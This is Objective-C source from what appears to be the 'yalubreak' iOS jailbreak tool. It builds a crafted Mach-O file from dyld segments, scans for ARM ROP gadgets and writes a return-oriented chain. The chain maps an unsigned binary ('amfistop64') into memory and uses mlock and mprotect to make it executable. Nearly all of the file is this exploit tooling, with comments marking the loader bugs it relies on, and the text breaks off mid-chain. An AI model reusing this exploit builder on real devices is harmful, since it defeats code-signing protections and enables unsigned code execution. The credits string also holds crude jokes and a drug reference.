//
//  main.m
//  build-o
//
//  Created by qwertyoruiop on 14/09/15.
//  Copyright (c) 2015 Kim Jong Cracks. All rights reserved.
//

//  thanks to windknown & pangu team

#include <mach-o/loader.h>
#include <mach-o/ldsyms.h>
#include <mach-o/reloc.h>
#include <mach/mach.h>
#include <mach-o/fat.h>
#include <mach-o/getsect.h>
#include <sys/syscall.h>
#import <Foundation/Foundation.h>
#import "libxnuexp.h"
#include "symbols.h"
#include "defines.h"

#define INVALID_GADGET 0x37133713

#if __LP64__
#define macho_header			mach_header_64
#define mach_hdr				struct mach_header_64
#define LC_SEGMENT_COMMAND		LC_SEGMENT_64
#define macho_segment_command	segment_command_64
#define sgmt_cmd				struct segment_command_64
#define macho_section			section_64
#define RELOC_SIZE				3
#define MH_MAGIC_ MH_MAGIC_64
#else
#define macho_header			mach_header
#define mach_hdr				struct mach_header
#define LC_SEGMENT_COMMAND		LC_SEGMENT
#define macho_segment_command	segment_command
#define sgmt_cmd				struct segment_command
#define macho_section			section
#define RELOC_SIZE				2
#define MH_MAGIC_ MH_MAGIC
#endif

void rebaseDyld(const struct macho_header* mh, intptr_t slide)
{
    // get interesting pointers into dyld
    const uint32_t cmd_count = mh->ncmds;
    const struct load_command* const cmds = (struct load_command*)(((char*)mh)+sizeof(struct macho_header));
    const struct load_command* cmd = cmds;
    const struct macho_segment_command* linkEditSeg = NULL;
    const struct dysymtab_command* dynamicSymbolTable = NULL;
    const struct macho_section* nonLazySection = NULL;
    for (uint32_t i = 0; i < cmd_count; ++i) {
        switch (cmd->cmd) {
            case LC_SEGMENT_COMMAND:
            {
                const struct macho_segment_command* seg = (struct macho_segment_command*)cmd;
                if ( strcmp(seg->segname, "__LINKEDIT") == 0 )
                    linkEditSeg = seg;
                const struct macho_section* const sectionsStart = (struct macho_section*)((char*)seg + sizeof(struct macho_segment_command));
                const struct macho_section* const sectionsEnd = &sectionsStart[seg->nsects];
                for (const struct macho_section* sect=sectionsStart; sect < sectionsEnd; ++sect) {
                    const uint8_t type = sect->flags & SECTION_TYPE;
                    if ( type == S_NON_LAZY_SYMBOL_POINTERS )
                        nonLazySection = sect;
                }
            }
                break;
            case LC_DYSYMTAB:
                dynamicSymbolTable = (struct dysymtab_command *)cmd;
                break;
        }
        cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
    }
    
    // use reloc's to rebase all random data pointers
    const uintptr_t relocBase = (uintptr_t)mh;
    const struct relocation_info* const relocsStart = (struct relocation_info*)(linkEditSeg->vmaddr + slide + dynamicSymbolTable->locreloff - linkEditSeg->fileoff);
    const struct relocation_info* const relocsEnd = &relocsStart[dynamicSymbolTable->nlocrel];
    for (const struct relocation_info* reloc=relocsStart; reloc < relocsEnd; ++reloc) {
        if ( (reloc->r_address & R_SCATTERED) == 0 ) {
            if (reloc->r_length == RELOC_SIZE) {
                switch(reloc->r_type) {
                    case GENERIC_RELOC_VANILLA:
                        *((uintptr_t*)(reloc->r_address + relocBase)) += slide;
                        break;
                }
            }
        }
        else {
            const struct scattered_relocation_info* sreloc = (struct scattered_relocation_info*)reloc;
            if (sreloc->r_length == RELOC_SIZE) {
                uintptr_t* locationToFix = (uintptr_t*)(sreloc->r_address + relocBase);
                switch(sreloc->r_type) {
                    case GENERIC_RELOC_VANILLA:
                        // Note the use of PB_LA_PTR is unique here.  Seems like ld should strip out all lazy pointers
                        // but it does not.  But, since all lazy-pointers point within dyld, they can be slid too
                        *locationToFix += slide;
                        break;
                }
            }
        }
    }
    
    // rebase non-lazy pointers (which all point internal to dyld, since dyld uses no shared libraries)
    if ( nonLazySection != NULL ) {
        const uint32_t pointerCount = nonLazySection->size / sizeof(uintptr_t);
        uintptr_t* const symbolPointers = (uintptr_t*)(nonLazySection->addr + slide);
        for (uint32_t j=0; j < pointerCount; ++j) {
            symbolPointers[j] += slide;
        }
    }
    
    
}

void *g_fake_header = NULL;
size_t g_fake_header_size = 0x1000;

void *g_text_ptr = NULL;
size_t g_text_size = 0;
void *g_data_ptr = NULL;
void *r_data_ptr = NULL;
size_t g_data_size = 0;
size_t g_data_vmsize = 0;
void *g_lnk_ptr = NULL;
size_t g_lnk_size = 0;

void *g_cs_ptr = NULL;
size_t g_cs_size = 0;

void dump_dyld_segments(const uint8_t *macho_data)
{
    if (*(uint32_t *)macho_data == MH_MAGIC)
    {
        uint32_t text_file_off = 0;
        uint32_t text_file_size = 0;
        uint32_t cs_offset = 0;
        uint32_t cs_size = 0;
        
        struct mach_header* header = (struct mach_header*)macho_data;
        
        struct load_command *load_cmd = (struct load_command *)(header + 1);
        for (int i=0; i<header->ncmds; i++)
        {
            if (load_cmd->cmd == LC_SEGMENT)
            {
                struct segment_command *seg = (struct segment_command *)load_cmd;
                if (strcmp(seg->segname, "__TEXT") == 0)
                {
                    text_file_off = seg->fileoff;
                    text_file_size = seg->filesize - 0x1000;
                    
                    g_text_size = text_file_size;
                    g_text_ptr = malloc(text_file_size);
                    if (g_text_ptr == NULL)
                    {
                        NSLog(@"No place for text!");
                    }
                    
                    memcpy(g_text_ptr, macho_data+text_file_off+0x1000, text_file_size);
                    
                } else
                    if (strcmp(seg->segname, "__DATA") == 0)
                    {
                        text_file_off = seg->fileoff;
                        text_file_size = seg->filesize;
                        
                        g_data_size = text_file_size;
                        g_data_vmsize = seg->vmsize;
                        
                        g_data_ptr = malloc(text_file_size);
                        if (g_text_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(g_data_ptr, macho_data+text_file_off, text_file_size);
                        rebaseDyld((void*)macho_data, 0x50000000 - 0x1fe00000);
                        
                        r_data_ptr = malloc(g_data_size);
                        if (r_data_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(r_data_ptr, macho_data+text_file_off, text_file_size);
                        
                    }
                    else
                        if (strcmp(seg->segname, "__LINKEDIT") == 0)
                        {
                            text_file_off = seg->fileoff;
                            text_file_size = seg->filesize;
                            
                            g_lnk_size = text_file_size;
                            
                            g_lnk_ptr = malloc(text_file_size);
                            if (g_text_ptr == NULL)
                            {
                                NSLog(@"No place for linkedit!");
                            }
                            
                            memcpy(g_lnk_ptr, macho_data+text_file_off, text_file_size);
                            
                        }
                
            } else if (load_cmd->cmd == LC_CODE_SIGNATURE)
            {
                struct linkedit_data_command* cscmd = (struct linkedit_data_command*)load_cmd;
                
                cs_offset = cscmd->dataoff;
                cs_size = cscmd->datasize;
                
                g_cs_size = cs_size;
                g_cs_ptr = malloc(cs_size);
                if (g_cs_ptr == NULL)
                {
                    NSLog(@"no place for cs!");
                }
                
                memcpy(g_cs_ptr, macho_data+cs_offset, cs_size);
                
                NSLog(@"cs_size = %x", cs_size);
            }
            
            load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
        }
    }
    else if (*(uint32_t *)macho_data == MH_MAGIC_64)
    {
        uint64_t text_file_off_64 = 0;
        uint64_t text_file_size_64 = 0;
        uint64_t cs_offset_64 = 0;
        uint64_t cs_size_64 = 0;
        
        struct mach_header_64* header = (struct mach_header_64*)macho_data;
        
        struct load_command *load_cmd = (struct load_command *)(header + 1);
        for (int i=0; i<header->ncmds; i++)
        {
            if (load_cmd->cmd == LC_SEGMENT_64)
            {
                struct segment_command_64 *seg = (struct segment_command_64 *)load_cmd;
                if (strcmp(seg->segname, "__TEXT") == 0)
                {
                    text_file_off_64 = seg->fileoff;
                    text_file_size_64 = seg->filesize-0x1000;
                    
                    g_text_size = (size_t)text_file_size_64;
                    
                    g_text_ptr = malloc((size_t)text_file_size_64);
                    if (g_text_ptr == NULL)
                    {
                        NSLog(@"No place for text!");
                    }
                    
                    memcpy(g_text_ptr, macho_data+text_file_off_64+0x1000, (size_t)text_file_size_64);
                    
                } else
                    if (strcmp(seg->segname, "__DATA") == 0)
                    {
                        text_file_off_64 = seg->fileoff;
                        text_file_size_64 = seg->filesize;
                        
                        g_data_size = (size_t)text_file_size_64;
                        g_data_vmsize = (size_t)seg->vmsize;
                        
                        g_data_ptr = malloc(g_data_size);
                        if (g_data_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(g_data_ptr, macho_data+text_file_off_64, g_data_size);
                        
                        rebaseDyld((void*)macho_data, 0x50000000 - 0x1fe00000);
                        
                        r_data_ptr = malloc(g_data_size);
                        if (r_data_ptr == NULL)
                        {
                            NSLog(@"No place for data!");
                        }
                        
                        memcpy(r_data_ptr, macho_data+text_file_off_64, g_data_size);
                        
                    } else
                        if (strcmp(seg->segname, "__LINKEDIT") == 0)
                        {
                            text_file_off_64 = seg->fileoff;
                            text_file_size_64 = seg->filesize;
                            
                            g_lnk_size = (size_t)text_file_size_64;
                            
                            g_lnk_ptr = malloc((size_t)text_file_size_64);
                            if (g_text_ptr == NULL)
                            {
                                NSLog(@"No place for text!");
                            }
                            
                            memcpy(g_lnk_ptr, macho_data+text_file_off_64, (size_t)text_file_size_64);
                            
                        }
                
            } else if (load_cmd->cmd == LC_CODE_SIGNATURE)
            {
                struct linkedit_data_command* cscmd = (struct linkedit_data_command*)load_cmd;
                
                cs_offset_64 = cscmd->dataoff;
                cs_size_64 = cscmd->datasize;
                
                g_cs_size = (size_t)cs_size_64;
                
                g_cs_ptr = malloc((size_t)cs_size_64);
                if (g_cs_ptr == NULL)
                {
                    NSLog(@"no place for cs!");
                }
                
                memcpy(g_cs_ptr, macho_data+cs_offset_64, (size_t)cs_size_64);
                
                NSLog(@"cs_size = %llx", cs_size_64);
            }
            load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
        }
    }
    assert(g_cs_size > 0);
    assert(g_data_size > 0);
    assert(g_text_size > 0);
    assert(g_lnk_size > 0);
    g_lnk_size = round_page(g_lnk_size);
}

void dump_dyld_header(uint8_t *header)
{
    g_fake_header = malloc(g_fake_header_size);
    if (g_fake_header == NULL)
    {
        NSLog(@"No place for header!");
    }
    
    memcpy(g_fake_header, header, g_fake_header_size);
}


void process_dyld_file(NSString *srcPath)
{
    // get an valid signature
    NSFileHandle *inputHdl = [NSFileHandle fileHandleForReadingAtPath:srcPath];
    if (inputHdl == nil)
    {
        NSLog(@"open input file fail");
        return;
    }
    
    NSData *header = [inputHdl readDataOfLength:2048];
    struct fat_header *fat_hdr = (struct fat_header *)[header bytes];
    if (OSSwapInt32(fat_hdr->magic) == FAT_MAGIC)
    {
        NSLog(@"input is a fat file");
        
        struct fat_arch *arch = (struct fat_arch *)(fat_hdr + 1);
        for (int i=0; i<OSSwapInt32(fat_hdr->nfat_arch); i++)
        {
            [inputHdl seekToFileOffset:OSSwapInt32(arch->offset)];
            NSData *myData = [inputHdl readDataOfLength:OSSwapInt32(arch->size)];
            
            const uint8_t *headerc =  [myData bytes];
            uint8_t *header = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
            memcpy(header, headerc, [myData length]);
            
            // dump header
            dump_dyld_header(header);
            // dump segments
            dump_dyld_segments(header);
            arch++;
        }
    }
    else
    {
        [inputHdl seekToFileOffset:0];
        NSData *myData = [inputHdl readDataToEndOfFile];
        const uint8_t *headerc =  [myData bytes];
        void * mem = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
        if ((int)mem == -1) {
            NSLog(@"Error %s", strerror(errno));
            exit(1);
        }
        uint8_t *header = mem;
        memcpy(header, headerc, [myData length]);
        
        // dump header
        dump_dyld_header(header);
        // dump segments
        dump_dyld_segments(header);
    }
}

void *local_memcpy_ptrsized(void *dst, const void *src, size_t n)
{
    // sanity  check that the length is an even multiple of a pointer size
    //    assert((n % sizeof(void*)) == 0);
    for (size_t i=0; i < (n/sizeof(void*)); i++) {
        ((void**)dst)[i] = ((void**)src)[i];
    }
    return dst;
}

int main(int argc, const char * argv[]) {
    
    /* mapping */
    
    uint32_t fsz = 0;
    
    NSString *dyld_path = @"./dyld";
    
    
    
    process_dyld_file(dyld_path);
    
    uintptr_t dyld_base = 0x50001001;
#define DeclGadget(name, pattern, size) uint32_t name = (uint32_t)memmem(g_text_ptr, g_text_size, (void*)pattern, size); assert(name); name -= (uint32_t)g_text_ptr; name += (uint32_t)dyld_base
#define TryDeclGadget(name, pattern, size, res) uint32_t name = (uint32_t)memmem(g_text_ptr, g_text_size, (void*)pattern, size); if ((res= name != 0)){ name -= (uint32_t)g_text_ptr; name += (uint32_t)dyld_base;} else {name = INVALID_GADGET;}
    
    int fd=open("./magic.dylib", O_CREAT | O_RDWR | O_TRUNC, 0755);
    assert(fd > 0);
    ftruncate(fd, (0x10000000));
    char* buf = mmap(NULL, (0x10000000), PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    assert(buf != (void *)-1);
    
    /* write mach header */
    
    
    xnuexp_mach_o * dy = [xnuexp_mach_o withContentsOfFile:dyld_path];
    //    assert(dy.hdr->cpusubtype == mh.cpusubtype && dy.hdr->cputype == mh.cputype);
    if (!dy) {
        xnuexp_fat_mach_o  * fat_dy = [xnuexp_fat_mach_o withContentsOfFile:dyld_path];
        dy = [fat_dy getArchitectureByFirstMagicMatch:MH_MAGIC];
        assert(fat_dy && dy);
    }

    struct mach_header mh;
    mh.magic = dy.hdr->magic;
    mh.filetype = MH_EXECUTE; // must be MH_EXECUTE non-PIE (bug 1)
    mh.flags = 0; // must be MH_EXECUTE non-PIE (bug 1)
    mh.cputype = dy.hdr->cputype;
    mh.cpusubtype = dy.hdr->cpusubtype;
    mh.ncmds=0;
    mh.sizeofcmds=0;

    /* required on iOS */
    
    struct dyld_info_command dyld_ic;
    bzero(&dyld_ic, sizeof(dyld_ic));
    dyld_ic.cmd=LC_DYLD_INFO;
    dyld_ic.cmdsize=sizeof(dyld_ic);
    dyld_ic.export_off = 1337;
    
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &dyld_ic, dyld_ic.cmdsize);
    mh.sizeofcmds += dyld_ic.cmdsize;
    mh.ncmds++;
    
    struct segment_command load_cmd_seg;
    
    /* FakeTEXT segment */
    
    load_cmd_seg.fileoff = 0x1000;
    load_cmd_seg.filesize = (uint32_t)g_text_size - 0x1000;
    load_cmd_seg.vmsize = (uint32_t)g_text_size;
    load_cmd_seg.vmaddr = 0x50001000;
    load_cmd_seg.initprot = PROT_READ|PROT_EXEC; // must be EXEC
    load_cmd_seg.maxprot = PROT_READ|PROT_EXEC; // must be EXEC
    load_cmd_seg.cmd = LC_SEGMENT;
    load_cmd_seg.cmdsize = sizeof(load_cmd_seg);
    load_cmd_seg.flags = 0;
    load_cmd_seg.nsects = 0;
    strcpy(&load_cmd_seg.segname[0], "__DYLDTEXT"); // must be __PAGEZERO (bug 2)
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    
    char *code_data = (char*)(buf + fsz + 0x1000);
    memcpy(code_data, g_text_ptr, g_text_size);
    
    fsz += load_cmd_seg.filesize + 0x2000;
    
    // for all next segments
    load_cmd_seg.initprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable
    load_cmd_seg.maxprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable
    
    /* FakeDATA segment */
    
    uint32_t p = fsz;
    load_cmd_seg.vmaddr = 0x4F000000 + fsz;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = (uint32_t)g_data_size;
    load_cmd_seg.vmsize = (uint32_t)g_data_vmsize;
    strcpy(&load_cmd_seg.segname[0], "__DYLDDATAFAKE");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    code_data = (char*)(buf + fsz);
    memcpy(code_data, g_data_ptr, g_data_size);
    
    fsz += load_cmd_seg.filesize;
    
    /* FakeLINKEDIT segment */
    
    load_cmd_seg.vmaddr = 0x50000000 + p + g_data_vmsize;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = (uint32_t)g_lnk_size;
    load_cmd_seg.vmsize = (uint32_t)g_lnk_size;
    strcpy(&load_cmd_seg.segname[0], "__DYLDLINKEDIT");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    code_data = (char*)(buf + fsz);
    memcpy(code_data, g_lnk_ptr, g_lnk_size);
    
    fsz += load_cmd_seg.filesize;
    
    /* __DYLDDATA segment */
    
    load_cmd_seg.vmaddr = 0x50000000 + p;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = (uint32_t)g_data_size;
    load_cmd_seg.vmsize = (uint32_t)g_data_vmsize;
    strcpy(&load_cmd_seg.segname[0], "__DYLDDATA");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    
    code_data = (char*)(buf + fsz);
    memcpy(code_data, r_data_ptr, g_data_size);
    
    fsz += load_cmd_seg.filesize;
    
    __unused char *data = (char*)(buf + fsz);
    __unused char *dptr = (char*)(0x5A000000);
    
    /* __ROPCHAIN segment */
    
    load_cmd_seg.vmaddr = 0x51000000;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = 0x200000;
    load_cmd_seg.vmsize = 0x200000;
    strcpy(&load_cmd_seg.segname[0], "__ROPCHAIN");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
#define STACK_OFFSET_BASE 0x30000 // 0x4000
    uint32_t *stack = (uint32*)(buf + fsz + STACK_OFFSET_BASE);
    
    uint32_t *stackbase = stack;
    uint32_t segstackbase = load_cmd_seg.vmaddr + STACK_OFFSET_BASE;
    
    DeclGadget(mov_sp_r4_pop_r4r7pc, (&(char[]){0xa5,0x46,0x90,0xbd}), 4);
    DeclGadget(mov_r0_r4_pop_r4r7pc, (&(char[]){0x20,0x46,0x90,0xbd}), 4);
    DeclGadget(add_r0_r2_pop_r4r5r7pc, (&(char[]){0x10,0x44,0xb0,0xbd}), 4);
    DeclGadget(pop_r4r5r6r7pc, (&(char[]){0xf0,0xbd}), 2);
    DeclGadget(pop_r2pc, (&(char[]){0x04,0xbd}), 2);
    DeclGadget(pop_r4r7pc, (&(char[]){0x90,0xbd}), 2);
    DeclGadget(pop_r7pc, (&(char[]){0x80,0xbd}), 2);
    DeclGadget(bx_lr, (&(char[]){0x70,0x47}), 2);
    DeclGadget(not_r0_pop_r4r7pc, (&(char[]){0x01,0x46,0x00,0x20,0x00,0x29,0x08,0xbf,0x01,0x20,0x90,0xbd}), 12);
    DeclGadget(muls_r0r2r0_ldr_r2r4_str_r248_pop_r4r5r7pc, (&(char[]){0x50,0x43,0x22,0x68,0xC2,0xE9,0x0C,0x01,0xB0,0xBD}), 10);
    
    //not available in armv7 ant not actually required here
    
//    DeclGadget(bx_r2_pop_r4r5r7pc, (&(char[]){0x10,0x47,0xb0,0xbd}), 4);
    
    int armv7m = 0;
    int armv7 = 0;
    uint32_t lsrs_r0_2_popr4r5r7pc = INVALID_GADGET;
    TryDeclGadget(lsrs_r0_2_popr4r5r7pc_armv7m, (&(char[]){0x4F,0xEA,0x90,0x00,0xB0,0xBD}), 6,armv7m);
    //armv7: lsrs r0, r0, #0x2 pop  {r4, r5, r7, pc}
    TryDeclGadget(lsrs_r0_2_popr4r5r7pc_armv7, (&(char[]){0x80,0x08,0xB0,0xBD}), 4,armv7);
    assert(armv7m | armv7);
    lsrs_r0_2_popr4r5r7pc = (armv7m) ? lsrs_r0_2_popr4r5r7pc_armv7m : lsrs_r0_2_popr4r5r7pc_armv7;
    ///////
    TryDeclGadget(pop_r0r1r3r5r7pc, (&(char[]){0xab,0xbd}), 2,armv7m);
    //armv7: pop {r0, r2, r4, r6, r7, pc}
    TryDeclGadget(pop_r0r2r4r6r7pc, (&(char[]){0xd5,0xbd}), 2,armv7);
    assert(armv7m | armv7);
    
    
    
    DeclGadget(ldr_r0_r0_8_pop_r7pc, (&(char[]){0x80,0x68,0x80,0xbd}), 4);
    DeclGadget(str_r0_r4_8_pop_r4r7pc, (&(char[]){0xa0,0x60,0x90,0xbd}), 4);
    DeclGadget(bx_r2_add_sp_40_pop_r8r10r11r4r5r6r7pc, (&(char[]){0x10,0x47,0x10,0xB0,0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 10);
    DeclGadget(pop_r8r10r11r4r5r6r7pc, (&(char[]){0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 6);
    
    DeclGadget(pop_r0r1r2r3r5r7pc, (&(char[]){0xaf,0xbd}), 2);
    
    // new gadgets by in7egral
    DeclGadget(lsrs_r0_r0_2_pop_r4r5r7pc, (&(char[]){0x80,0x08,0xB0,0xBD}), 4);
    DeclGadget(pop_r4r7lr_bx_r1, (&(char[]){0xBD,0xE8,0x90,0x40,0x08,0x47}), 6);
    DeclGadget(str_r1_r0_4_pop_r4r5r7pc, (&(char[]){0x41,0x60,0xB0,0xBD}), 4);
    DeclGadget(syscall_80_bx_lr, (&(char[]){0x80,0x00,0x00,0xEF,0x1E,0xFF,0x2F,0xE1}), 8);
    // stack clear gadgets
    DeclGadget(add_sp_4_pop_r7pc, (&(char[]){0x01,0xB0,0x80,0xBD}), 4);
    DeclGadget(add_sp_8_pop_r7pc, (&(char[]){0x02,0xB0,0x80,0xBD}), 4);
    DeclGadget(add_sp_C_pop_r7pc, (&(char[]){0x03,0xB0,0x80,0xBD}), 4);
    //add_sp_10_pop_r7pc not found
    DeclGadget(pop_r10r11_pop_r4r5r7pc, (&(char[]){0xBD,0xE8,0x00,0x0C,0xB0,0xBD}), 6);
    DeclGadget(add_sp_14_pop_r7pc, (&(char[]){0x05,0xB0,0x80,0xBD}), 4);
    // for 4 + 8 arguments
    DeclGadget(add_sp_c_pop_r8r10_pop_r4r5r6r7pc, (&(char[]){0x03,0xB0,0xBD,0xE8,0x00,0x05,0xF0,0xBD}), 8);
    // read LR gadget
    DeclGadget(mov_r0_lr_pop_r7pc, (&(char[]){0x70,0x46,0x80,0xBD}), 4);
    
    [dy setSlide:-[dy base] + 0x50000000];

    
    args_t args_s;
    bzero(&args_s, sizeof(args_s));
    args_t* argss = &args_s;
    args_t* args_seg = (args_t*) 0x52000000;

	// copyrights
	NSLog(@"yalubreak iso841 - Kim Jong Cracks Research\nCredits:\nqwertyoruiop - sb escape & codesign bypass & initial kernel exploit\npanguteam: kernel vulns\nwindknown: kernel exploit & knows it's stuff\n_Morpheus_: this guy knows stuff\njk9356: kim jong cracks anthem\nJonSeals: crack rocks supply (w/ Frank & haifisch)\nih8sn0w: <3\nposixninja: <3\nxerub <3\nits_not_herpes because thanks god it wasnt herpes\neric fuck off\nKim Jong Un for being Dear Leader.\nRIP TTWJ / PYTECH / DISSIDENT\nSHOUT OUT @ ALL THE OLD GANGSTAS STILL IN THE JB SCENE\nHEROIN IS THE MEANING OF LIFE\n\nBRITTA ROLL UP [no its not pythech!] \n[i] iomasterport: 0x%08x / gasgauge user client: 0x%08x\njk++\n");

    
    NSLog(@"sizeof(args_t) = %lx", sizeof(args_t));

    uint32_t tmp;
    // after mov_sp_r4_pop_r4r7pc gadget
    *stack++ = 0x44444444; // R4
    *stack++ = m_m_scratch; // R7
    
    ///////////////////////////////
    // START FriedApple bytec0de //
    ///////////////////////////////

    // get LR
    *stack++ = mov_r0_lr_pop_r7pc;
    *stack++ = m_m_scratch; // R7
    RopAddR0(PUSH, 0xFFFE3577);
    StoreR0(PUSH, SEG_VAR(__dyld_start));
  
    strcpy(argss->a, "/var/mobile/Media/amfistop64");
    
    
    void *indata;
    const char *localPath = "../untether/amfistop64";
	NSLog(@"Using %s as local copy (remote path %s)", localPath, argss->a);
    // read file (need to read on ROP too)
    int fd_local = open(localPath, O_RDWR);
    // dub for ROP
    
    RopCallFunction2(PUSH, @"_open", SEG_VAR(a), O_RDWR);
    
    
    // save fd
    StoreR0(PUSH, SEG_VAR(fd1));
    
    if (fd_local >= 0) {
        struct stat st;
        if (fstat(fd_local, &st) >= 0) {
            int mmap_prot = PROT_READ | PROT_WRITE;
            int mmap_flag = MAP_PRIVATE;
            size_t size = (size_t)st.st_size;
            indata = mmap(NULL, size, mmap_prot, mmap_flag, fd_local, 0);
            // dub for ROP
            RopCallFunction7Deref1(PUSH, @"___mmap", 4, SEG_VAR(fd1), NULL, size, mmap_prot, mmap_flag, -123, 0, 0);
            
            // save memory page address
            StoreR0(PUSH, SEG_VAR(indata));
            // close fd
            close(fd_local);
            // dub for ROP
            RopCallFunction1Deref1(PUSH, @"_close", 0, SEG_VAR(fd1), -123);
            if (indata) {
                // Not require to be changed on ROP version (check MACHo for correctness)
                mach_hdr* hdr = (mach_hdr*) indata;
                if (hdr->magic != MH_MAGIC_) {
                    NSLog(@"not a mach-o, contents: %s", indata);
                    exit(0);
                }
                
                vm_address_t base = 0;
                vm_address_t end = 0;
                uintptr_t text_size = 0;
                
                // Not require to be changed on ROP version (calculate base and end)
                struct load_command* lc = (struct load_command*) (hdr+1);
                for (int i = 0; i < hdr->ncmds; i++) {
                    if (lc->cmd == LC_SEGMENT_COMMAND) {
                        sgmt_cmd* sg = (sgmt_cmd*)lc;
                        if (!(sg->fileoff == 0 && sg->filesize == 0 && sg->vmaddr == 0)) {
                            if (sg->vmaddr < base || base == 0) {
                                base = sg->vmaddr;
                            }
                            if (sg->vmaddr + sg->vmsize > end) {
                                end = sg->vmaddr + sg->vmsize;
                            }
                        }
                    }
                    lc = (struct load_command*)(((char*)lc) + lc->cmdsize);
                }
                

				// read file on ROP
                //int fd = open(localPath, O_RDONLY);
                RopCallFunction2(PUSH, @"_open", SEG_VAR(a), O_RDONLY);
                // save fd
                StoreR0(PUSH, SEG_VAR(fd2));

                // calc virtual size
                size_t vm_size = end - base;
                
                
                // mmap file on ROP
                //void *filedata1 = mmap(NULL, size*2, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
                RopCallFunction7Deref1(PUSH, @"___mmap", 4, SEG_VAR(fd2), NULL, vm_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, -123, 0, 0);
				NSLog(@"mmap with size %lx (size * 2 = %lx)", vm_size, size * 2);
                // save filedata1
                StoreR0(PUSH, SEG_VAR(filedata1));
                // mmap file on ROP
                //void *filedata2 = mmap(filedata1, size*2, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, 0, 0);
                RopCallFunction7Deref1(PUSH, @"___mmap", 0, SEG_VAR(filedata1), -123, vm_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, 0, 0, 0);
                // save filedata2
                StoreR0(PUSH, SEG_VAR(filedata2));
                
                lc = (struct load_command*) (hdr+1);
                for (int i = 0; i < hdr->ncmds; i++) {
                    if (lc->cmd == LC_SEGMENT_COMMAND) {
                        sgmt_cmd* sg = (sgmt_cmd*)lc;
                        if (!(sg->fileoff == 0 && sg->filesize == 0 && sg->vmaddr == 0)) {
                            // calculate address on ROP
                            //void* addr = (void*)(sg->vmaddr - base + filedata2);
                            LoadIntoR0(PUSH, SEG_VAR(filedata2));
                            RopAddR0(PUSH, sg->vmaddr - base); // 0x0021d000
                            StoreR0(PUSH, SEG_VAR(addr));
                            // get size
                            uintptr_t size = sg->vmsize;
                            
                            // zero destination memory on ROP
                            //bzero(addr, size);
                            RopCallFunction2Deref1(PUSH, @"___bzero", 0, SEG_VAR(addr), -123, size);
							NSLog(@"bzero(addr, 0x%lx); // &addr = 0x%x  ", size, (void*)&argss->addr + (int)args_seg - (void*)argss);
                            
                            // copy data on ROP
                            //memcpy(addr, indata + sg->fileoff, sg->filesize);
                            // get indata + sg->fileoff
                            LoadIntoR0(PUSH, SEG_VAR(indata));
                            RopAddR0(PUSH, sg->fileoff);
                            StoreR0(PUSH, SEG_VAR(copyaddr));
                            // call _bcopy
                            //RopCallFunction3(PUSH, @"_bcopy", SEG_VAR(addr), SEG_VAR(tmp1), sg->filesize);
                            [dy setSlide:dy.slide+1]; // enter thumb
                            RopCallFunction3Deref2(PUSH, @"_bcopy", 0, SEG_VAR(copyaddr), 1, SEG_VAR(addr), -123, -123, sg->filesize);
                            [dy setSlide:dy.slide-1]; // exit thumb
                            NSLog(@"bcopy segment %s by offset 0x%x, size 0x%x", sg->segname, sg->fileoff, sg->filesize);
                            if (strcmp(sg->segname, "__TEXT") == 0) {
                                // not require to be changed on ROP (calculate text_size)
                                text_size = sg->filesize;
                                // need to store address on ROP
                                //text_addr = (uintptr_t)addr;
                                LoadIntoR0(PUSH, SEG_VAR(addr));
                                StoreR0(PUSH, SEG_VAR(text_addr));
                            }
                        }
                    }
                    lc = (struct load_command*)(((char*)lc) + lc->cmdsize);
                }
                
                
				//NSLog(@"text_addr %lx, text_size %lx", text_addr, text_size);
                // mlock __TEXT pages on ROP
                //mlock((void*)text_addr, text_size);
                RopCallFunction3Deref1(PUSH, @"___syscall", 1, SEG_VAR(text_addr), SYS_mlock, -123, text_size);
				
                
				// protect __TEXT pages with PROT_EXEC | PROT_READ on ROP
                //mprotect((void*)text_addr, text_size, PROT_EXEC | PROT_READ);
                RopCallFunction4Deref1(PUSH, @"___syscall", 1, SEG_VAR(text_addr), SYS_mprotect, -123, text_size, PROT_READ|PROT_EXEC);
                
                // call ===================>REAL<================== __dyld_start
